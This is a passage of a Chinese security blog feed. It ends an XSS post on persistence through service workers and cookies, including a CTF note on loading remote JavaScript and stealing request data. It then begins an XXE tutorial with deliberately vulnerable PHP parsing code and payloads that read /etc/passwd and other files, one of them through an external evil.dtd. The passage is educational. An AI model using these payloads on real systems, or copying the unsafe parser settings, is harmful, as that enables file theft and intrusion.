            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;then&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Response from network is:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Fetching failed:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;访问mytest.js：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 769; 
			flex-basis: 1846px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xss/image-20220122132006689.png&#34; data-size=&#34;577x75&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xss/image-20220122132006689.png&#34;
			width=&#34;577&#34;
			height=&#34;75&#34;
			srcset=&#34;https://coollllllll.github.io/p/xss/image-20220122132006689_hubbd51b7779baf1a8f3c79017f626e2d5_10965_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xss/image-20220122132006689_hubbd51b7779baf1a8f3c79017f626e2d5_10965_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;ctf例子中的service-worker&#34;&gt;CTF例子中的Service Worker&lt;/h4&gt;
&lt;p&gt;2020西湖论剑 hardxss&lt;/p&gt;
&lt;p&gt;参考：https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss/&lt;/p&gt;
&lt;p&gt;例子中重要的点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;code&gt;iframe&lt;/code&gt;跨域在其他域(其他域设置了父域)执行js&lt;/li&gt;
&lt;li&gt;jsonp接口传入callback参数中：使用&lt;code&gt;self.importScripts(&#39;vps_addr/test.js&#39;)&lt;/code&gt;引入外部js文件，用作service worker的逻辑处理&lt;/li&gt;
&lt;li&gt;窃取GET数据：location.search;窃取POST数据：event.request.body&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;持久化之cookie-和-localstorage&#34;&gt;持久化之cookie 和 localStorage&lt;/h3&gt;
&lt;p&gt;网站有可能会将信息存储在 Cookie 或 localStorage ，而因为这些数据一般是网站主动存储的，且一般没有或很久没有对 Cookie 或 localStorage 中取出的数据过滤，而是直接展示在页面中。因此当有一个XSS时，可以把payload写入其中，在对应条件下触发。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>XXE 相关</title>
        <link>https://coollllllll.github.io/p/xxe/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/xxe/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/xxe/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post XXE 相关" /&gt;&lt;h1 id=&#34;xxe漏洞&#34;&gt;XXE漏洞&lt;/h1&gt;
&lt;p&gt;XXE(XML External Entity Injection)漏洞，全称XML外部实体注入。该漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;危害：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件读取&lt;/li&gt;
&lt;li&gt;命令执行&lt;/li&gt;
&lt;li&gt;攻击内网网站&lt;/li&gt;
&lt;li&gt;..&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xml基础&#34;&gt;XML基础&lt;/h2&gt;
&lt;h3 id=&#34;定义&#34;&gt;定义&lt;/h3&gt;
&lt;p&gt;XML是一种类似于HTML的标记语言，但是 XML 没有使用预定义的标记。因此，可以根据自己的设计需求定义专属于自己的标记。这是一种十分有用的可存储、可搜索和可共享的格式存储数据的方法。&lt;/p&gt;
&lt;p&gt;跨系统或平台共享或传输 XML ，无论是在本地还是在互联网上，接收方仍然可以根据标准化的 XML 语法解析数据。&lt;/p&gt;
&lt;p&gt;XML设计宗旨是传输数据，而不是显示数据；HTML被设计用来显示数据。&lt;/p&gt;
&lt;h3 id=&#34;结构&#34;&gt;结构&lt;/h3&gt;
&lt;p&gt;XML文档包含XML声明、DTD文档类型定义(该部分可选)、文档元素三部分。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- 声明信息 --&amp;gt;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; ?&amp;gt;&lt;/span&gt;

&lt;span class=&#34;nt&#34;&gt;&amp;lt;message&amp;gt;&lt;/span&gt;
	&lt;span class=&#34;nt&#34;&gt;&amp;lt;receiver&amp;gt;&lt;/span&gt;me&lt;span class=&#34;nt&#34;&gt;&amp;lt;/receiver&amp;gt;&lt;/span&gt;
	&lt;span class=&#34;nt&#34;&gt;&amp;lt;sender&amp;gt;&lt;/span&gt;somebody&lt;span class=&#34;nt&#34;&gt;&amp;lt;/sender&amp;gt;&lt;/span&gt;
	&lt;span class=&#34;nt&#34;&gt;&amp;lt;header&amp;gt;&lt;/span&gt;TheReminder&lt;span class=&#34;nt&#34;&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;
	&lt;span class=&#34;nt&#34;&gt;&amp;lt;msg&amp;gt;&lt;/span&gt;This is an amazing msg&lt;span class=&#34;nt&#34;&gt;&amp;lt;/msg&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/message&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;dtd&#34;&gt;DTD&lt;/h3&gt;
&lt;p&gt;DTD(Document Type Definition)，文档类型定义，通过定义DTD说明XML文档中有哪些模块以及各模块中有哪些内容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例-定义内部DTD：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;!-- 声明信息 --&amp;gt;
&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;

&amp;lt;!-- 定义内部 DTD --&amp;gt;
&amp;lt;!DOCTYPE message [
	&amp;lt;!ELEMENT message (receiver ,sender ,header ,msg)&amp;gt;
	&amp;lt;!ELEMENT receiver (#PCDATA)&amp;gt;
	&amp;lt;!ELEMENT sender (#PCDATA)&amp;gt;
	&amp;lt;!ELEMENT header (#PCDATA)&amp;gt;
	&amp;lt;!ELEMENT msg (#PCDATA)&amp;gt;
]&amp;gt;

&amp;lt;message&amp;gt;
	&amp;lt;receiver&amp;gt;me&amp;lt;/receiver&amp;gt;
	&amp;lt;sender&amp;gt;somebody&amp;lt;/sender&amp;gt;
	&amp;lt;header&amp;gt;TheReminder&amp;lt;/header&amp;gt;
	&amp;lt;msg&amp;gt;This is an amazing msg&amp;lt;/msg&amp;gt;
&amp;lt;/message&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;除了在DTD 中定义元素（对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容，也可类似声明变量)，例如某些内容是固定不变的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例-定义实体：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [
	&amp;lt;!ELEMENT foo ANY &amp;gt;
	&amp;lt;!ENTITY xxe &amp;quot;test&amp;quot;&amp;gt;]&amp;gt;

&amp;lt;!-- ANY表示可接收任何元素；在这里定义了一个&#39;xxe&#39;的实体，其实可以看成一个变量，后续可以在 XML中通过 &amp;amp; 符号进行引用） --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;定义上述实体后，在元素部分即可这样引用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xaml&#34; data-lang=&#34;xaml&#34;&gt;&amp;lt;creds&amp;gt;
&amp;lt;user&amp;gt;&amp;amp;xxe;&amp;lt;/user&amp;gt;
&amp;lt;pass&amp;gt;mypass&amp;lt;/pass&amp;gt;
&amp;lt;/creds&amp;gt;

&amp;lt;!-- 使用 &amp;amp;xxe; 对 上面定义的 xxe 实体进行了引用，当输出时， &amp;amp;xxe; 就会被 &amp;quot;test&amp;quot; 替换。 --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;实体可分为&lt;strong&gt;内部实体和外部实体&lt;/strong&gt;，上述例子是内部实体，当然实体也可以从外部DTD文件中引用。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [
&amp;lt;!ELEMENT foo ANY &amp;gt;
&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///c:/test.dtd&amp;quot; &amp;gt;]&amp;gt;
&amp;lt;creds&amp;gt;
    &amp;lt;user&amp;gt;&amp;amp;xxe;&amp;lt;/user&amp;gt;
    &amp;lt;pass&amp;gt;mypass&amp;lt;/pass&amp;gt;
&amp;lt;/creds&amp;gt;

&amp;lt;!-- 引用外部实体时，当引用资源发生改变，则在xml文档中就可以自动更新 --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还有一种引用外部实体方式是引用公用DTD：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;!DOCTYPE 根元素名称 PUBLIC &amp;quot;DTD标识名&amp;quot; &amp;quot;公用DTD的URI&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;实体也可分为&lt;strong&gt;通用实体和参数实体&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通用实体&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;&amp;amp;实体名;&lt;/code&gt;引用的实体，在DTD中定义，在XML文档中引用。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;

&amp;lt;!DOCTYPE updateProfile [
    &amp;lt;!ENTITY file SYSTEM &amp;quot;file:///c:/windows/win.ini&amp;quot;&amp;gt;]&amp;gt; 

&amp;lt;updateProfile&amp;gt;  
    &amp;lt;firstname&amp;gt;Joe&amp;lt;/firstname&amp;gt;  
    &amp;lt;lastname&amp;gt;&amp;amp;file;&amp;lt;/lastname&amp;gt;  
    ... 
&amp;lt;/updateProfile&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;参数实体&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 &lt;code&gt;% 实体名&lt;/code&gt;(&lt;strong&gt;中间有个空格&lt;/strong&gt;) 在 DTD 中定义，并且&lt;strong&gt;只能在 DTD 中使用 &lt;code&gt;%实体名;&lt;/code&gt; 引用参数实体&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;只有在&lt;strong&gt;DTD文件&lt;/strong&gt;中，参数实体的声明才能引用其他实体&lt;/li&gt;
&lt;li&gt;和通用实体一样，参数实体也可以外部引用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;!ENTITY % an-element &amp;quot;&amp;lt;!ELEMENT mytag (subtag)&amp;gt;&amp;quot;&amp;gt; 
&amp;lt;!ENTITY % remote-dtd SYSTEM &amp;quot;http://somewhere.example.org/remote.dtd&amp;quot;&amp;gt; 
%an-element; %remote-dtd;
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;xml实体注入&#34;&gt;XML实体注入&lt;/h2&gt;
&lt;p&gt;当引用了一个外部实体后，就可能存在一定的问题，如下代码是一个引用外部实体的例子：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;

&amp;lt;!DOCTYPE demo[
    &amp;lt;!ENTITY content SYSTEM &amp;quot;file:///c:/test.dtd&amp;quot;&amp;gt;
]&amp;gt;

&amp;lt;demo&amp;gt;&amp;amp;content;&amp;lt;/demo&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当更改路径dtd文件的路径，是否就可直接获得一些敏感文件的内容。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;XXE的重点就在于关注外部实体。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;h3 id=&#34;读取敏感文件&#34;&gt;读取敏感文件&lt;/h3&gt;
&lt;h4 id=&#34;有回显&#34;&gt;有回显&lt;/h4&gt;
&lt;p&gt;当服务端接收XML文档解析并进行回显时，即可修改XML代码以读取服务端上的敏感文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 服务端
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;libxml_disable_entity_loader&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$xmlfile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;php://input&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$dom&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DOMDocument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$dom&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;loadXML&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$xmlfile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LIBXML_NOENT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LIBXML_DTDLOAD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
    &lt;span class=&#34;nv&#34;&gt;$creds&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;simplexml_import_dom&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$dom&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;// 加载xml文档内容并echo进行回显
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; 

&amp;lt;!DOCTYPE test [  
&amp;lt;!ENTITY file SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt; ]&amp;gt; 

&amp;lt;test&amp;gt;&amp;amp;file;&amp;lt;/test&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 347px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xxe/image-20220126110557674.png&#34; data-size=&#34;637x440&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xxe/image-20220126110557674.png&#34;
			width=&#34;637&#34;
			height=&#34;440&#34;
			srcset=&#34;https://coollllllll.github.io/p/xxe/image-20220126110557674_hub55227d2c8385f2cf398786ab25de2d5_9556_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xxe/image-20220126110557674_hub55227d2c8385f2cf398786ab25de2d5_9556_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意：读取文件时，文件所在目录要有可执行权限&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;问题：上述例子读取了一个纯净文件，那么当文件中含有影响xml文档语义的字符该怎么办？例如&lt;code&gt;&amp;lt;&lt;/code&gt;,&lt;code&gt;&amp;gt;&lt;/code&gt;,&lt;code&gt;&amp;amp;&lt;/code&gt;,&lt;code&gt;&amp;quot;&lt;/code&gt;,&lt;code&gt;&#39;&lt;/code&gt;等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 220; 
			flex-basis: 528px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xxe/image-20220127093942420.png&#34; data-size=&#34;165x75&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xxe/image-20220127093942420.png&#34;
			width=&#34;165&#34;
			height=&#34;75&#34;
			srcset=&#34;https://coollllllll.github.io/p/xxe/image-20220127093942420_huf2d9ee7be16e40b90f375c09542f7af4_2501_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xxe/image-20220127093942420_huf2d9ee7be16e40b90f375c09542f7af4_2501_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可成功读出，当加入特殊字符，则无法读出：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 251; 
			flex-basis: 604px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xxe/image-20220127094032701.png&#34; data-size=&#34;146x58&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xxe/image-20220127094032701.png&#34;
			width=&#34;146&#34;
			height=&#34;58&#34;
			srcset=&#34;https://coollllllll.github.io/p/xxe/image-20220127094032701_huf8aaa44f7642369b73891a9e402b8a8c_2442_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xxe/image-20220127094032701_huf8aaa44f7642369b73891a9e402b8a8c_2442_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决1-引入CDATA：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;CDATA的作用就是将原始数据内容视为纯字符数据而不再具备语义。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;![CDATA [
....
]]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以只要将读出的文本内容用CDATA包裹起来就可以。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;需要借助参数实体：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; 
&amp;lt;!DOCTYPE test [
&amp;lt;!ENTITY % start &amp;quot;&amp;lt;![CDATA[&amp;quot;&amp;gt;   
&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///usr/haha&amp;quot;&amp;gt;  
&amp;lt;!ENTITY % end &amp;quot;]]&amp;gt;&amp;quot;&amp;gt;  
&amp;lt;!ENTITY % dtd SYSTEM &amp;quot;http://192.168.0.106/evil.dtd&amp;quot;&amp;gt; 
%dtd; ]&amp;gt; 

&amp;lt;test&amp;gt;&amp;amp;all;&amp;lt;/test&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;evil.dtd:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!ENTITY all &amp;quot;%start;%file;%end;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可成功读出：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 227; 
			flex-basis: 545px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xxe/image-20220127095502383.png&#34; data-size=&#34;175x77&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xxe/image-20220127095502383.png&#34;
			width=&#34;175&#34;
			height=&#34;77&#34;
			srcset=&#34;https://coollllllll.github.io/p/xxe/image-20220127095502383_huaf734452eef41019ff667f6d209c749b_1450_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xxe/image-20220127095502383_huaf734452eef41019ff667f6d209c749b_1450_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决2-伪协议编码读取：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; 

&amp;lt;!DOCTYPE test [  
&amp;lt;!ENTITY file SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=file:///usr/haha&amp;quot;&amp;gt; ]&amp;gt; 

&amp;lt;test&amp;gt;&amp;amp;file;&amp;lt;/test&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;无回显&#34;&gt;无回显&lt;/h4&gt;
&lt;p&gt;实际环境中XML更多用于配置文件和传输数据，一般不会有回显。所以更多是无回显的场景。即，&lt;strong&gt;blind XXE&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 服务端
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;libxml_disable_entity_loader&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$xmlfile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;php://input&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
